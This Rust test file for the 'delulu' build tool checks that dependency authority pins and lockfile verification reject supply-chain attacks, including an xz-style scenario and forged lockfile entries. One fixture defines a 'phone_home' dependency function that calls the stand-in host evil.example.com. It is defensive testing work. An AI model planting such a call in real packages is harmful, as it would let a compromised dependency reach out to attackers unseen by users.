//! Stage-2 provenance acceptance tests: dependency resolution, authority pins, the lockfile, and
//! the semver-authority law — exercised end-to-end through the real `delulu` binary.
//!
//! These build temporary multi-package workspaces on disk and assert on the JSON diagnostic
//! contract (codes + repair flags) and process exit codes. The headline is the xz-style scenario:
//! a pinned-pure dependency that gains a `!{Net}` function must fail the build with DL1001 BEFORE
//! any code runs.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

use serde_json::Value;

fn delulu(args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_delulu")).args(args).output().expect("failed to run delulu")
}

fn stdout(o: &Output) -> String {
    String::from_utf8_lossy(&o.stdout).to_string()
}

/// A fresh, empty workspace scratch directory.
fn scratch(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("delulu_prov_{name}"));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

fn write(dir: &Path, rel: &str, contents: &str) {
    let p = dir.join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, contents).unwrap();
}

/// Diagnostic codes in an `--json` envelope's `diagnostics` array.
fn codes(o: &Output) -> Vec<String> {
    let v: Value = serde_json::from_str(&stdout(o)).unwrap_or_else(|_| panic!("expected JSON, got: {}", stdout(o)));
    v["diagnostics"]
        .as_array()
        .map(|a| a.iter().filter_map(|d| d["code"].as_str().map(str::to_string)).collect())
        .unwrap_or_default()
}

fn has(o: &Output, code: &str) -> bool {
    codes(o).iter().any(|c| c == code)
}

// A dependency that genuinely performs `Net` (a `Cap[Http].get`).
const NET_FN: &str = "pub fn phone_home(c: Cap[Http]) -> Str ! {Net} {\n  match c.get(\"http://evil.example.com\") { Ok(body) => body, Err(_) => \"\" }\n}\n";
// A dependency function that performs `Write`.
const WRITE_FN: &str = "pub fn log(o: Cap[Console]) ! {Write} { o.println(\"x\") }\n";

// ===== cross-package resolution =================================================================

#[test]
fn cross_package_call_builds_clean() {
    let ws = scratch("xpkg");
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\nmathlib = { path = \"../mathlib\", authority = { effects = [] } }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nimport mathlib\nfn main(root: Root) { }\nfn compute() -> Int { triple(7) }\n");
    write(&ws, "mathlib/delulu.toml", "[package]\nname=\"mathlib\"\nversion=\"0.1.0\"\nkind=\"lib\"\n[authority]\neffects=[]\n");
    write(&ws, "mathlib/src/lib.delulu", "module mathlib\npub fn triple(n: Int) -> Int { n * 3 }\n");

    let o = delulu(&["build", ws.join("app").to_str().unwrap(), "--json"]);
    assert!(codes(&o).is_empty(), "expected a clean cross-package build, got {:?}\n{}", codes(&o), stdout(&o));
    assert_eq!(o.status.code(), Some(0));
}

// ===== the xz scenario (acceptance criterion 7) =================================================

#[test]
fn pinned_pure_dependency_gaining_net_fails_dl1001_before_running() {
    let ws = scratch("xz");
    // Root pins `compress` to effects=[] — "this compression library must be provably pure".
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\ncompress = { path = \"../compress\", authority = { effects = [] } }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nfn main(root: Root) { }\n");
    // The dependency has quietly gained a network-calling function.
    write(&ws, "compress/delulu.toml", "[package]\nname=\"compress\"\nversion=\"0.2.0\"\nkind=\"lib\"\n[authority]\neffects=[\"Net\"]\n");
    write(&ws, "compress/src/lib.delulu", &format!("module compress\npub fn crush(data: Str) -> Str {{ data }}\n{NET_FN}"));

    let o = delulu(&["build", ws.join("app").to_str().unwrap(), "--json"]);
    assert!(has(&o, "DL1001"), "expected DL1001 (dep exceeds pin), got {:?}\n{}", codes(&o), stdout(&o));
    assert_eq!(o.status.code(), Some(1), "the build must FAIL — before any code runs");
}

#[test]
fn missing_pin_is_dl1001_with_widening_repair() {
    let ws = scratch("nopin");
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\nmathlib = { path = \"../mathlib\" }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nfn main(root: Root) { }\n");
    write(&ws, "mathlib/delulu.toml", "[package]\nname=\"mathlib\"\nversion=\"0.1.0\"\nkind=\"lib\"\n[authority]\neffects=[]\n");
    write(&ws, "mathlib/src/lib.delulu", "module mathlib\npub fn triple(n: Int) -> Int { n * 3 }\n");

    let o = delulu(&["build", ws.join("app").to_str().unwrap(), "--json"]);
    assert!(has(&o, "DL1001"), "missing pin must be DL1001: {:?}", codes(&o));
    let v: Value = serde_json::from_str(&stdout(&o)).unwrap();
    let d = v["diagnostics"].as_array().unwrap().iter().find(|d| d["code"] == "DL1001").unwrap();
    assert_eq!(d["repairs"][0]["authority_widening"], true, "accepting a dep's own authority is a widening decision");
    assert_eq!(o.status.code(), Some(1));
}

// ===== the lockfile =============================================================================

fn clean_two_package_ws(name: &str) -> PathBuf {
    let ws = scratch(name);
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\nmathlib = { path = \"../mathlib\", authority = { effects = [] } }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nimport mathlib\nfn main(root: Root) { }\nfn compute() -> Int { triple(7) }\n");
    write(&ws, "mathlib/delulu.toml", "[package]\nname=\"mathlib\"\nversion=\"0.1.0\"\nkind=\"lib\"\n[authority]\neffects=[]\n");
    write(&ws, "mathlib/src/lib.delulu", "module mathlib\npub fn triple(n: Int) -> Int { n * 3 }\n");
    ws
}

#[test]
fn lockfile_round_trip_then_locked_build() {
    let ws = clean_two_package_ws("lock_rt");
    let app = ws.join("app");

    let o = delulu(&["lock", app.to_str().unwrap()]);
    assert_eq!(o.status.code(), Some(0), "lock should succeed: {}", String::from_utf8_lossy(&o.stderr));

    let lock = std::fs::read_to_string(app.join("delulu.lock")).expect("delulu.lock written");
    assert!(lock.contains("[[package]]"), "lock has package entries: {lock}");
    assert!(lock.contains("content_hash"), "lock records content hashes");
    assert!(lock.contains("\"mathlib\"") && lock.contains("\"app\""), "lock names both packages");

    let o = delulu(&["build", app.to_str().unwrap(), "--locked", "--json"]);
    assert!(codes(&o).is_empty(), "locked build should verify clean: {:?}\n{}", codes(&o), stdout(&o));
    assert_eq!(o.status.code(), Some(0));
}

#[test]
fn tampered_dependency_source_is_dl1010() {
    let ws = clean_two_package_ws("tamper");
    let app = ws.join("app");
    assert_eq!(delulu(&["lock", app.to_str().unwrap()]).status.code(), Some(0));

    // Tamper the dependency's source under its locked version (a comment changes the bytes).
    let src = ws.join("mathlib/src/lib.delulu");
    let mut text = std::fs::read_to_string(&src).unwrap();
    text.push_str("\n// tampered after lock\n");
    std::fs::write(&src, text).unwrap();

    let o = delulu(&["build", app.to_str().unwrap(), "--locked", "--json"]);
    assert!(has(&o, "DL1010"), "tampered source must be DL1010: {:?}\n{}", codes(&o), stdout(&o));
    assert_eq!(o.status.code(), Some(1));
}

#[test]
fn stale_authority_hash_under_matching_content_is_dl1002() {
    // The lock claims one authority but the source computes another (a maliciously regenerated
    // content_hash on an unchanged version string). Content matches; authority hash does not.
    let ws = clean_two_package_ws("authhash");
    let app = ws.join("app");
    assert_eq!(delulu(&["lock", app.to_str().unwrap()]).status.code(), Some(0));

    let lock_path = app.join("delulu.lock");
    let corrupted: String = std::fs::read_to_string(&lock_path)
        .unwrap()
        .lines()
        .map(|l| if l.trim_start().starts_with("authority_hash") { "authority_hash = \"blake3:0000\"".to_string() } else { l.to_string() })
        .collect::<Vec<_>>()
        .join("\n");
    std::fs::write(&lock_path, corrupted).unwrap();

    let o = delulu(&["build", app.to_str().unwrap(), "--locked", "--json"]);
    assert!(has(&o, "DL1002"), "stale authority hash must be DL1002: {:?}\n{}", codes(&o), stdout(&o));
    assert_eq!(o.status.code(), Some(1));
}

#[test]
fn locked_build_without_lockfile_is_dl1011() {
    let ws = clean_two_package_ws("nolock");
    let app = ws.join("app");
    let o = delulu(&["build", app.to_str().unwrap(), "--locked", "--json"]);
    assert!(has(&o, "DL1011"), "no lockfile under --locked must be DL1011: {:?}", codes(&o));
    assert_eq!(o.status.code(), Some(1));
}

// ===== the semver-authority law =================================================================

/// A workspace where `netdep` is pinned wide (Net+Write) but v1 only performs Net.
fn widening_ws(name: &str) -> PathBuf {
    let ws = scratch(name);
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\nnetdep = { path = \"../netdep\", authority = { effects = [\"Net\", \"Write\"] } }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nfn main(root: Root) { }\n");
    write(&ws, "netdep/delulu.toml", "[package]\nname=\"netdep\"\nversion=\"1.0.0\"\nkind=\"lib\"\n[authority]\neffects=[\"Net\", \"Write\"]\n");
    write(&ws, "netdep/src/lib.delulu", &format!("module netdep\n{NET_FN}"));
    ws
}

/// Widen `netdep`'s computed authority (add a Write fn) and set its version.
fn widen_netdep(ws: &Path, version: &str) {
    write(ws, "netdep/delulu.toml", &format!("[package]\nname=\"netdep\"\nversion=\"{version}\"\nkind=\"lib\"\n[authority]\neffects=[\"Net\", \"Write\"]\n"));
    write(ws, "netdep/src/lib.delulu", &format!("module netdep\n{NET_FN}{WRITE_FN}"));
}

#[test]
fn authority_widening_with_minor_bump_is_dl1003() {
    let ws = widening_ws("widen_minor");
    let app = ws.join("app");
    assert_eq!(delulu(&["lock", app.to_str().unwrap()]).status.code(), Some(0), "initial lock");

    widen_netdep(&ws, "1.1.0"); // authority grows Net -> Net,Write with only a MINOR bump
    let o = delulu(&["lock", app.to_str().unwrap(), "--json"]);
    assert!(has(&o, "DL1003"), "widening + minor bump must be DL1003: {:?}\n{}", codes(&o), stdout(&o));
    assert_eq!(o.status.code(), Some(1), "re-lock must be refused");
}

#[test]
fn accept_authority_with_major_bump_records_accepted_by() {
    let ws = widening_ws("accept");
    let app = ws.join("app");
    assert_eq!(delulu(&["lock", app.to_str().unwrap()]).status.code(), Some(0), "initial lock");

    widen_netdep(&ws, "2.0.0"); // MAJOR bump this time
    let o = delulu(&["lock", app.to_str().unwrap(), "--accept-authority", "netdep"]);
    assert_eq!(o.status.code(), Some(0), "major bump + acceptance should lock: {}", String::from_utf8_lossy(&o.stderr));

    let lock = std::fs::read_to_string(app.join("delulu.lock")).unwrap();
    assert!(lock.contains("--accept-authority netdep"), "accepted_by must be recorded: {lock}");
}

// ===== resolution errors ========================================================================

#[test]
fn import_ambiguous_between_local_and_dependency_is_dl1006() {
    let ws = scratch("ambig");
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\nlib1 = { path = \"../lib1\", authority = { effects = [] } }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nimport shared\nfn main(root: Root) { }\n");
    write(&ws, "app/src/shared.delulu", "module shared\npub fn a() -> Int { 1 }\n");
    write(&ws, "lib1/delulu.toml", "[package]\nname=\"lib1\"\nversion=\"0.1.0\"\nkind=\"lib\"\n[authority]\neffects=[]\n");
    write(&ws, "lib1/src/shared.delulu", "module shared\npub fn b() -> Int { 2 }\n");

    let o = delulu(&["build", ws.join("app").to_str().unwrap(), "--json"]);
    assert!(has(&o, "DL1006"), "local/dep module name collision must be DL1006: {:?}", codes(&o));
    assert_eq!(o.status.code(), Some(1));
}

#[test]
fn two_sources_for_one_package_name_is_dl1008() {
    let ws = scratch("conflict");
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\np1 = { path = \"../p1\", authority = { effects = [] } }\np2 = { path = \"../p2\", authority = { effects = [] } }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nfn main(root: Root) { }\n");
    // Two distinct directories both declaring package name `conflict`.
    write(&ws, "p1/delulu.toml", "[package]\nname=\"conflict\"\nversion=\"0.1.0\"\nkind=\"lib\"\n[authority]\neffects=[]\n");
    write(&ws, "p1/src/lib.delulu", "module conflict\npub fn one() -> Int { 1 }\n");
    write(&ws, "p2/delulu.toml", "[package]\nname=\"conflict\"\nversion=\"9.9.9\"\nkind=\"lib\"\n[authority]\neffects=[]\n");
    write(&ws, "p2/src/lib.delulu", "module conflict\npub fn one() -> Int { 1 }\n");

    let o = delulu(&["build", ws.join("app").to_str().unwrap(), "--json"]);
    assert!(has(&o, "DL1008"), "two sources for one name must be DL1008: {:?}", codes(&o));
    assert_eq!(o.status.code(), Some(1));
}

#[test]
fn git_dependency_without_pinned_rev_is_dl1007() {
    let ws = scratch("gitpin");
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[]\n[dependencies]\nwebby = { git = \"https://github.com/x/webby\" }\n",
    );
    write(&ws, "app/src/main.delulu", "module app\nfn main(root: Root) { }\n");

    let o = delulu(&["build", ws.join("app").to_str().unwrap(), "--json"]);
    assert!(has(&o, "DL1007"), "unpinned git dep must be DL1007: {:?}", codes(&o));
    assert_eq!(o.status.code(), Some(1));
}

// ----- the review surface must be usable on a real package (C51) --------------------------------

/// **`delulu authority` must answer for a package that HAS dependencies.** It used to refuse them:
/// the command ran the single-package loader while `build`, `check`, `lock` and `authority --diff`
/// all resolve the dependency graph, so every package with a dependency died on DL0303 ("unknown
/// module") while `build` on the very same directory succeeded. In a monorepo that is nearly every
/// package — and "what does this dependency let my package do?" is the supply-chain question this
/// command exists to answer, so the one case it could not handle was the one that matters most.
///
/// The dependency's contribution has to be VISIBLE, not merely tolerated: its modules and its pure
/// functions belong in the report, because a reviewer is deciding whether to trust the whole graph.
#[test]
fn authority_reports_a_package_that_has_dependencies() {
    let root = scratch("authority-with-deps");
    write(
        &root,
        "lib/delulu.toml",
        "[package]\nname=\"lib\"\nversion=\"0.1.0\"\n[authority]\neffects=[]\n",
    );
    write(&root, "lib/src/main.delulu", "module lib\n\npub fn fetchish(x: Int) -> Int {\n    x + 7\n}\n");
    write(
        &root,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[\"Write\"]\n\
         [dependencies]\nlib = { path = \"../lib\", authority = { effects = [] } }\n",
    );
    write(
        &root,
        "app/src/main.delulu",
        "module app\n\nimport lib\n\nfn main(root: Root) ! {Write} {\n    let c = root.console()\n\
         \x20   c.println(str(fetchish(1)))\n}\n",
    );
    let app = root.join("app");

    // `build` accepted this package all along; the point is that `authority` now agrees.
    let b = delulu(&["build", &app.display().to_string()]);
    assert!(b.status.success(), "the fixture must build: {}", stdout(&b));

    let o = delulu(&["authority", &app.display().to_string()]);
    assert!(
        o.status.success(),
        "`authority` must answer for a package with a dependency — `build` does:\n{}{}",
        stdout(&o),
        String::from_utf8_lossy(&o.stderr)
    );
    let text = stdout(&o);
    assert!(text.contains("lib"), "the dependency's module belongs in the report:\n{text}");
    assert!(
        text.contains("fetchish"),
        "and so does what it contributes — a reviewer is judging the whole graph:\n{text}"
    );

    // The machine surface carries the same answer (no discrimination between surfaces).
    let j = delulu(&["authority", &app.display().to_string(), "--json"]);
    assert!(j.status.success(), "--json too: {}", String::from_utf8_lossy(&j.stderr));
    let v: Value = serde_json::from_slice(&j.stdout).expect("authority --json is one object");
    assert_eq!(v["summary"]["errors"], serde_json::json!(0), "{v}");
}

/// The case the C51 fix must NOT break, and nearly did. `resolve_workspace` requires a manifest and
/// reports DL1004 without one, so routing every `authority <dir>` through it would have refused a
/// plain directory of modules — legal since C26/D33 and deliberately preserved by C50. A manifest is
/// what makes a directory a package, so its presence is what selects the loader.
#[test]
fn authority_still_answers_for_a_directory_with_no_manifest() {
    let root = scratch("authority-no-manifest");
    write(
        &root,
        "bare/src/main.delulu",
        "module bare\n\nfn main(root: Root) ! {Write} {\n    let c = root.console()\n    c.println(\"bare\")\n}\n",
    );
    let o = delulu(&["authority", &root.join("bare").display().to_string()]);
    assert!(
        o.status.success(),
        "a directory of modules with no manifest is not a package, and reporting on it is legal:\n{}",
        String::from_utf8_lossy(&o.stderr)
    );
    assert!(stdout(&o).contains("bare"), "{}", stdout(&o));

    // …while a manifest that IS present and unreadable is still refused (C50).
    write(&root, "broken/delulu.toml", "");
    write(
        &root,
        "broken/src/main.delulu",
        "module broken\n\nfn main(root: Root) ! {Write} {\n    let c = root.console()\n    c.println(\"x\")\n}\n",
    );
    let bad = delulu(&["authority", &root.join("broken").display().to_string()]);
    assert!(
        !bad.status.success(),
        "an empty manifest is present-and-unreadable, which C50 refuses:\n{}",
        stdout(&bad)
    );
}

// ----- a lockfile must not be able to lie about what a dependency does (C52) --------------------

/// Rewrite `app/delulu.lock`, asserting the pattern was actually present so a stale fixture cannot
/// silently turn one of these cases into a no-op.
fn tamper_lock(app: &Path, from: &str, to: &str) {
    let p = app.join("delulu.lock");
    let text = std::fs::read_to_string(&p).expect("lockfile written");
    assert!(text.contains(from), "tamper pattern `{from}` absent from the lockfile:\n{text}");
    std::fs::write(&p, text.replace(from, to)).unwrap();
}

/// **`build --locked` must verify what the lockfile SAYS, not only what it hashes.**
///
/// `verify_locked` compared a recomputed `content_hash` and a recomputed `authority_hash` against
/// the stored ones — and never looked at `effects`, `cap_kinds`, `secrets` or the scope lists. Those
/// are the fields a human opens a lockfile to read. So a lockfile could claim a dependency has no
/// effects and no capabilities while that dependency reaches the network, and the locked build
/// printed "built clean".
///
/// What made it undeniable: `authority --diff` on the very same forged pair reports `+ effects Net`
/// and `verdict: WIDENING`. The interactive review command caught what the automated CI gate did
/// not — which is backwards, because CI is where nobody is looking.
#[test]
fn a_locked_build_refuses_a_lockfile_that_misstates_a_dependencys_authority() {
    let ws = scratch("lock_lies");
    write(
        &ws,
        "netlib/delulu.toml",
        "[package]\nname=\"netlib\"\nversion=\"0.1.0\"\nkind=\"lib\"\n[authority]\neffects=[\"Net\"]\n",
    );
    // Genuinely performs Net — the point is a real capability, not a declared-but-unused one.
    write(
        &ws,
        "netlib/src/lib.delulu",
        "module netlib\n\npub fn reach(h: Cap[Http]) -> Int ! {Net} {\n    let r = h.get(\"http://x.example.com/p\")\n    1\n}\n",
    );
    write(
        &ws,
        "app/delulu.toml",
        "[package]\nname=\"app\"\nversion=\"0.1.0\"\nkind=\"bin\"\n[authority]\neffects=[\"Net\"]\n\
         [dependencies]\nnetlib = { path = \"../netlib\", authority = { effects = [\"Net\"] } }\n",
    );
    write(
        &ws,
        "app/src/main.delulu",
        "module app\nimport netlib\nfn main(root: Root) ! {Net} {\n    let h = root.http([\"x.example.com\"])\n    let n = reach(h)\n}\n",
    );
    let app = ws.join("app");
    assert_eq!(delulu(&["lock", app.to_str().unwrap()]).status.code(), Some(0));

    // The control: untampered, the locked build passes. Without this the refusals below prove nothing.
    let ok = delulu(&["build", app.to_str().unwrap(), "--locked"]);
    assert_eq!(ok.status.code(), Some(0), "the fixture must build locked: {}", stdout(&ok));

    // Now make the lockfile claim the dependency is inert.
    tamper_lock(&app, "effects        = [\"Net\"]\ncap_kinds      = [\"Http\"]", "effects        = []\ncap_kinds      = []");
    let o = delulu(&["build", app.to_str().unwrap(), "--locked", "--json"]);
    assert_ne!(
        o.status.code(),
        Some(0),
        "a lockfile claiming a network-reaching dependency has no effects must not build clean:\n{}",
        stdout(&o)
    );
    assert!(
        codes(&o).contains(&"DL1002".to_string()),
        "the lock entry misstates the package's authority — DL1002: {:?}\n{}",
        codes(&o),
        stdout(&o)
    );
}

/// Three more ways a lockfile can be wrong that a hash check cannot see. Each is something a bad
/// merge or an attacker produces, and each was accepted before.
#[test]
fn a_locked_build_refuses_a_stale_duplicated_or_unreadable_lockfile() {
    let base = clean_two_package_ws("lock_shapes");
    let app = base.join("app");
    assert_eq!(delulu(&["lock", app.to_str().unwrap()]).status.code(), Some(0));
    let good = std::fs::read_to_string(app.join("delulu.lock")).unwrap();
    let restore = || std::fs::write(app.join("delulu.lock"), &good).unwrap();

    // Control first.
    assert_eq!(delulu(&["build", app.to_str().unwrap(), "--locked"]).status.code(), Some(0));

    // 1. A version this toolchain cannot read pins NOTHING — it must not be interpreted as v1.
    //    Same rule as an unverifiable signature algorithm (DL1908): refusing to read is refusing.
    restore();
    tamper_lock(&app, "version = 1", "version = 999");
    let o = delulu(&["build", app.to_str().unwrap(), "--locked"]);
    assert_ne!(o.status.code(), Some(0), "an unreadable lock format must not build: {}", stdout(&o));

    // 2. Two entries for one package is an ambiguity, refused rather than resolved (the C40 rule).
    restore();
    let dup = {
        let text = std::fs::read_to_string(app.join("delulu.lock")).unwrap();
        let at = text.find("[[package]]\nname           = \"mathlib\"").expect("mathlib entry");
        format!("{text}\n{}", &text[at..])
    };
    std::fs::write(app.join("delulu.lock"), dup).unwrap();
    let o = delulu(&["build", app.to_str().unwrap(), "--locked"]);
    assert_ne!(o.status.code(), Some(0), "a duplicated lock entry must not build: {}", stdout(&o));

    // 3. A recorded version that is not the package's version means the lock is stale, and
    //    `--locked` exists precisely to refuse a resolution that was never pinned.
    restore();
    tamper_lock(&app, "name           = \"mathlib\"\nversion        = \"0.1.0\"", "name           = \"mathlib\"\nversion        = \"9.9.9\"");
    let o = delulu(&["build", app.to_str().unwrap(), "--locked"]);
    assert_ne!(o.status.code(), Some(0), "a stale locked version must not build: {}", stdout(&o));
}
